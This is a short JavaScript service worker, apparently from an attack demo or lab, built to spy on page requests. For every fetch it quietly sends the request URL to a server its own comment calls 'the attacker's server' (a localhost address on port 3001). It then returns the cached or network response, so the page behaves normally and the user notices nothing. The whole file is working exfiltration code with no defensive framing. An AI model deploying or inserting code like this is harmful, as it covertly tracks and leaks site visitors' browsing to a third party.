self.addEventListener('fetch', function(e) {
  e.respondWith(
    caches.match(e.request).then(function(response) {
      // Send the request URL to the attacker's server
      fetch('http://localhost:3001/fetch_url/' + encodeURIComponent(e.request.url));

      // Return the cached response if available, otherwise fetch from network
      return response || fetch(e.request).then(function(networkResponse) {
        return networkResponse;
      }).catch(function(networkError) {
        throw networkError;
      });
    }).catch(function(cacheError) {
      return fetch(e.request).then(function(networkResponse) {
        return networkResponse;
      }).catch(function(networkError) {
        throw networkError;
      });
    })
  );
});
